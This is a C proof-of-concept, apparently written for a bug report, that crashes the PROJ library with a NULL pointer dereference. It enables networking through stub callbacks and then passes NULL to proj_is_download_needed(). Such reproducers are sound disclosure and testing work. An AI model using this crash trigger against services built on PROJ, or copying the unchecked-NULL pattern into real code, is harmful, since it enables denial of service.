/*
 * PoC for SF23 / SF18 / SF24:
 * NULL pointer dereference in nfm_is_tilde_slash() when name is NULL,
 * reachable via proj_is_download_needed() public API.
 *
 * Affected file: PROJ/src/networkfilemanager.cpp
 * Affected functions:
 *   - nfm_is_tilde_slash()   line 2268-2270
 *   - nfm_is_rel_or_absolute_filename()  line 2272-2278
 *   - build_url()            line 2280-2292
 *   - proj_is_download_needed()  line 2523+
 *
 * Crash: SEGV (READ from address 0x0) at networkfilemanager.cpp:2269
 *
 * Compile inside container:
 *   clang -std=c11 -fsanitize=address -g -O1 \
 *     -I/src/PROJ/src \
 *     net_SF23_poc.c \
 *     /proj4-build/lib/libproj.a \
 *     -lpthread /host-lib/libsqlite3.so.0 -ldl -lm -lstdc++ \
 *     -o net_SF23_poc
 *
 * Run:
 *   ASAN_OPTIONS=detect_leaks=0 PROJ_DATA=/out/asan ./net_SF23_poc
 */

#include "proj.h"
#include <stdio.h>

/* Minimal stub callbacks to satisfy proj_context_set_network_callbacks()
   so that proj_context_is_network_enabled() returns true. Without these,
   proj_is_download_needed() would return early before reaching build_url(). */
static PROJ_NETWORK_HANDLE *my_open(
        PJ_CONTEXT *ctx, const char *url,
        unsigned long long offset, size_t size_to_read, void *buffer,
        size_t *out_size_read, size_t error_string_max_size,
        char *out_error_string, void *user_data) {
    return NULL;
}
static void my_close(PJ_CONTEXT *ctx, PROJ_NETWORK_HANDLE *handle,
        void *user_data) {}
static const char *my_get_header(PJ_CONTEXT *ctx, PROJ_NETWORK_HANDLE *handle,
        const char *header_name, void *user_data) { return NULL; }
static size_t my_read_range(PJ_CONTEXT *ctx, PROJ_NETWORK_HANDLE *handle,
        unsigned long long offset, size_t size_to_read, void *buffer,
        size_t error_string_max_size, char *out_error_string,
        void *user_data) { return 0; }

int main(void) {
    PJ_CONTEXT *ctx = proj_context_create();

    /* Install custom callbacks so PROJ treats networking as available
       (without libcurl, the default callbacks mark net as disabled). */
    proj_context_set_network_callbacks(
        ctx, my_open, my_close, my_get_header, my_read_range, NULL);
    proj_context_set_enable_network(ctx, 1);

    printf("Network enabled: %d\n", proj_context_is_network_enabled(ctx));

    /* Passing NULL as url_or_filename:
       proj_is_download_needed()
         -> build_url(ctx, NULL)
           -> nfm_is_tilde_slash(NULL)   <-- dereferences NULL: *name at line 2269
       CRASH: SEGV READ from 0x0 */
    printf("Triggering NULL deref via proj_is_download_needed(ctx, NULL, 0)...\n");
    fflush(stdout);

    int result = proj_is_download_needed(ctx, NULL, 0);
    printf("Result: %d  (unreachable)\n", result);

    proj_context_destroy(ctx);
    return 0;
}
